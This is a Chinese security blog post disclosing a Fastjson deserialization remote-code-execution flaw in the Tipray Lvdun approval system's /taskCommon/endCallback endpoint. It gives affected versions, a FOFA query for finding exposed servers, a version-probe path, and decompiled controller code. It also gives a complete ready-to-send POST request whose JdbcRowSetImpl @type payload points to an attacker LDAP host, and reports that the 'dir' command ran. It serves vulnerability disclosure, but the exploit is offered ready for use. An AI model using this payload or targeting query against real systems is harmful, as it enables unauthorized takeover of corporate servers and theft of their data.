---
title: "天锐绿盾审批系统 /taskCommon/endCallback fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-endCallback-rce.html
asset_dir: assets/天锐绿盾审批系统-taskcommonendcallback-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /taskCommon/endCallback fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/5 08:35
* 352浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

授权

安全

Authorization


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞扫描服务

该系统的 `/taskCommon/endCallback` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的[反序列化](https://mrxn.net/tag/rce)缺陷，在未经授权的情况下，在服务器端执行任意代码。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

技术文章订阅

服务器安全服务

网络安全培训

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 文件大小转换

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /taskCommon/endCallback fastjson反序列化漏洞](images/img-001-d0247ff34fe6.webp)](https://image.mrxn.net/e6c5636018224ffea4a7f519367b9f61.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

深入探索

防火墙软件

Windows安全工具

Web安全书籍

再看`/taskCommon/endCallback` 的实现部分

```
@RequestMapping(
    value = {"/endCallback"},
    method = {RequestMethod.POST},
    produces = {"application/json"}
)
public Map<String, Object> endCallback(@RequestBody Map<String, Object> params) {
    if (params.get("workflowInstanceId") != null && !StringUtils.isEmpty(params.get("workflowInstanceId").toString())) {
        if (params.get("approval") != null && !StringUtils.isEmpty(params.get("approval").toString())) {
            if (params.get("data") == null) {
                if (params.get("userLoginName") == null && params.get("approvalResult") == null && params.get("approvalTime") == null && params.get("approvalComment") == null) {
                    log.error("url参数【data】为空");
                    return this.returnResultMap(false, "Parameter data is empty", (Object)null);
                }

                if (params.get("userLoginName") == null || StringUtils.isEmpty(params.get("userLoginName").toString())) {
                    log.error("url参数【userLoginName】为空");
                    return this.returnResultMap(false, "Parameter userLoginName is empty", (Object)null);
                }

                if (params.get("approvalTime") == null || StringUtils.isEmpty(params.get("approvalTime").toString())) {
                    log.error("url参数【approvalTime】为空");
                    return this.returnResultMap(false, "Parameter approvalTime is empty", (Object)null);
                }

                List<Map> data = new ArrayList();
                Map<String, Object> mapData = new HashMap();
                mapData.put("userLoginName", params.get("userLoginName").toString());
                mapData.put("approvalResult", params.get("approval").toString());
                mapData.put("approvalTime", params.get("approvalTime").toString());
                mapData.put("approvalComment", params.get("approvalComment") == null ? "" : params.get("approvalComment").toString());
                data.add(mapData);
                params.put("data", data);
            }

            String workflowInstanceId = params.get("workflowInstanceId").toString();
            String approval = params.get("approval").toString();
            List<Map> data = JSON.parseArray(JSON.toJSONString(params.get("data")), Map.class);
            ThirdSystemRecord thirdSystemRecord = this.thirdSystemRecordService.findThirdSystemRecordByBpmInstId(workflowInstanceId);
```

关键点

```
List<Map> data = JSON.parseArray(JSON.toJSONString(params.get("data")), Map.class);
```

1. `params` 来自于 `@RequestBody`，意味着其内容完全由客户端（攻击者）控制。
2. `params.get("data")` 获取到的是一个 `Object` 对象，它在 Spring 的 `HttpMessageConverter`（通常是 Jackson 或 Gson）处理后，可能是一个 `ArrayList<LinkedHashMap>` 结构。
3. `JSON.toJSONString(params.get("data"))` 将这个对象重新序列化为 JSON 字符串。如果 `data` 字段本身就是一个恶意的 JSON 对象，这个过程会将其原样转为字符串。
4. `JSON.parseArray(...)` 是漏洞触发的关键点。根据其 API 特征，这很可能是阿里巴巴的 Fastjson 库。Fastjson 在默认配置下会开启 `autotype` 功能，允许通过 `@type` 字段指定要反序列化的类。
5. 当攻击者在 `data` 字段中提供一个包含恶意 `@type` 的 JSON 对象时，`JSON.parseArray` 会尝试加载并实例化该恶意类，从而触发[RCE](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

漏洞扫描服务

[![天锐绿盾审批系统 /taskCommon/endCallback fastjson反序列化漏洞](images/img-002-f885b081867d.webp)](https://image.mrxn.net/a0fa1ff1aaa349e888ab9e640106f920.webp)

> 1. 校验 `workflowInstanceId` 和 `approval` 参数是否存在。
> 2. 根据 `data` 参数是否存在，决定是直接使用该参数，还是根据 `userLoginName`、`approvalTime` 等参数重新构造一个 `data` 对象。

```
POST /trwfe/ws/taskCommon/endCallback HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "workflowInstanceId": "any-non-empty-string",
    "approval": "true",
    "data": [
        {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://192.168.168.11:50389/165c51",
            "autoCommit": true
        }
    ]
}
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /taskCommon/endCallback fastjson反序列化漏洞](images/img-003-f05102b521fc.webp)](https://image.mrxn.net/91e4c5b28f594cebb86eed05973f6da7.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 /taskCommon/endCallback fastjson反序列化漏洞](https://mrxn.net/jswz/trwfe-endCallback-rce.html)  
文章链接：<https://mrxn.net/jswz/trwfe-endCallback-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-endCallback-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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